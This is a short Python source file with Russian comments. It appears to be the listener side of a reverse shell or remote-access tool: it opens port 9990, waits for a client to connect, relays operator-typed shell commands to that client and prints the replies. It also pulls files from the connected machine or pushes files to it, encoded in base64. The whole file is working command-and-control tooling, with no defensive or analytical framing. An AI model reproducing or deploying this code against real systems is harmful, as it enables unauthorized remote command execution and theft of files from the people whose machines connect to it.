from  datetime import datetime
import json
import socket 
import base64
from typing import List

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    #Настройка подключения
listener.bind(("0.0.0.0", 9990))
listener.listen(0)
print("[+] Waiting for incoming connections")
cl_socket, remote_address = listener.accept()                   #Получение значений сокета и адреса при подтверждении подключения
print(f"[+] Got a connection from {remote_address} ")

def download_from_client(command):              #Скачивание файла с клиента
    _, _, file, newpath = command.split(' ')
    cl_socket.send(command.encode())                    #Отправка команды клиенту
    file = cl_socket.recv(1024)                         #Получение значения файла
    with open((newpath),"wb") as output_file:
        output_file.write(base64.b64decode(file))       #Создание и заполнение файла
    print(f"Файл скачен на сервер по пути {newpath}")

def download_from_server(command):              #Скачивание файла с сервера
    _, file, newpath = command.split()
    with open(file, "+rb") as file:
        file=base64.b64encode(file.read())              #Сохранение значения файла
    cl_socket.send(f"dl {newpath}".encode())            #Отправка комманды на клиент
    cl_socket.send(file)                                #Отправка значения файла
    response = cl_socket.recv(1024).decode()            #Получение ответа
    print(response)

def console_command(command):                   #Обычная команда для терминала
    cl_socket.send(command.encode())                    #Отправка команды на клиент
    response = cl_socket.recv(1024).decode()            #Получение ответа
    print(response)

def interact_console():                         #Взаимодейтсвие с консолью
    try:

        while True:
            command :str = input(">> ")             #Ввод команды
            if "dl" in command:                     #Если это команда скачивания
                if "-b" in command:
                    download_from_client(command)   #Если это скачивание с клиента
                else:
                    download_from_server(command)   #Если это скачивание с сервера
            else:
                console_command(command)            #Если это обычное команда для терминала
            
    except KeyboardInterrupt:                       #Прерывание программы
        listener.close()
        exit()

interact_console()